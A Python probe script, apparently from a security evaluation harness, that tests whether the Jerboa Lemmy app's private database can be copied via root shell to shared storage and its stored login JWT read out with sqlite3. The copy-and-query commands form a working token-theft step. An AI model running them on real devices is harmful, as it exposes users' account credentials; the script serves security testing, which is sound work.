#!/usr/bin/env python3
"""
Probe: Jerboa — access control (remote_attacker).
Isolated entry point for consolidated evaluation engine.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path


def _load_and_run():
    parent = Path(__file__).resolve().parent.parent
    if str(parent) not in sys.path:
        sys.path.insert(0, str(parent))

    from jerboa_probe_utils import (
        file_causal_stat,
        get_victim_jwt_from_db,
        quote_path,
        run_root_shell,
    )

    impact, summary = False, {"score": 1, "vectors": {}}
    victim_jwt = get_victim_jwt_from_db()
    if not victim_jwt:
        print(json.dumps(summary))
        return 1

    # V-001: Root/ADB database exfiltration
    # The remote attacker path is intentionally different from malicious-app:
    # it validates the database can be copied out through root-backed access.
    copied_db = "/sdcard/Android/data/com.lemmy.jerboa/files/mcb_db_copy"
    run_root_shell(f"rm -f {quote_path(copied_db)}")
    success, output = run_root_shell(
        "cp /data/data/com.lemmy.jerboa/databases/jerboa " f"{quote_path(copied_db)}"
    )
    if success:
        ok, stat = file_causal_stat(copied_db)
        if ok and isinstance(stat, dict):
            query = "SELECT jwt FROM Account LIMIT 1;"
            q_success, copied_jwt = run_root_shell(
                f"sqlite3 {quote_path(copied_db)} {quote_path(query)} 2>/dev/null"
            )
            if q_success and copied_jwt.strip() == victim_jwt:
                impact = summary["vectors"]["V-001"] = True

    summary["score"] = 0 if impact else 1
    print(json.dumps(summary))
    return 0 if impact else 1


if __name__ == "__main__":
    sys.exit(_load_and_run())
